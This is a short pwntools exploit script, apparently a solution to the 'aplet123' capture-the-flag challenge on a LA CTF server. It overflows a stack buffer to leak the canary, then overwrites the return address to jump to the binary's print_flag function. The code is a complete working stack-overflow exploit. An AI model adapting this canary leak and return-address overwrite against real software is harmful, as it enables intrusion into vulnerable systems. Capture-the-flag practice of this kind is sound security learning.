from pwn import *

elf = ELF('./aplet123')
#io = process(elf.path)
io = remote('chall.lac.tf', 31123)

# leak canary
payload = b'a' * (0x58 - 0x10 - 3)
payload += b"i'm"
io.sendlineafter(b'hello\n', payload)
io.recvuntil(b'hi ')
canary = int(u64(b'\x00' + io.recv(7)))
io.recvline()
log.info(f'canary: {hex(canary)}')

# ret2win
payload = b'a' * 72
payload += p64(canary)
payload += b'a' * 8
payload += p64(elf.symbols['print_flag'])
io.sendline(payload)

# out while loop
io.recvline()
io.sendline(b'bye')

io.interactive()


